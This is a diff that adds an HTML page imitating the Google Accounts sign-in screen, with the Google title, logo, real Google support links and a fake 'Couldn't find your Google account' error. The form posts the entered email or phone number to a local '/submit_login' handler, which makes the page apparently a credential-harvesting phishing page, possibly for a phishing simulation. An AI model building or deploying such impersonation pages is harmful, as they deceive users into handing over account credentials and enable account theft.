@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="stylesheet" href="/static/css/reset.css" />
+    <link rel="stylesheet" href="/static/css/styles.css" />
+
+    <title>Sign in - Google Accounts</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="card">
+        <img src="/static/images/google-logo.svg" alt="">
+        <h2>Sign in</h2>
+        <h3>Use your Google Account</h3>
+
+	<form action="/submit_login" method="post" id="loginForm">
+        <input type="text" id="userLogin" placeholder="Email or phone" name="user_login" required/> 
+        <div id="error-message" style="display: none; color: red; font-size: small;">Couldn't find your Google account</div>
+        <div class="btn-email">
+          <button type="button">
+            <a href="https://support.google.com/accounts/answer/7682439?hl=en" target="_blank">Forgot email?
+            </a>
+          </button>
+        </div>
+        <p>
+          Not your computer? Use Guest mode to sign in privately.
+        <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank">
+		Learn more about using Guest mode
+	</a>
+        </p>
+
+        <div class="card-bottom">
+   		<button type="submit">Next</button>
+        </div>
+        </form>
+      </div>
+
+      <div class="footer">
+        <select name="select">
+          <option value="English (United States)">
+            English (United States)
+          </option>
+        </select>
+
+        <div class="footer-span">
+          <span><a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a></span>
+          <span><a href="https://accounts.google.com/TOS?loc=PL&hl=en&privacy=true" target="_blank">Privacy</a></span>
+          <span><a href="https://accounts.google.com/TOS?loc=PL&hl=en" target="_blank">Terms</a></span>
+        </div>
+      </div>
+    </div>
+    <script src="/static/js/login-handler.js"></script>
+    <script src="/static/js/input-validator.js"></script>
+  </body>
+</html>
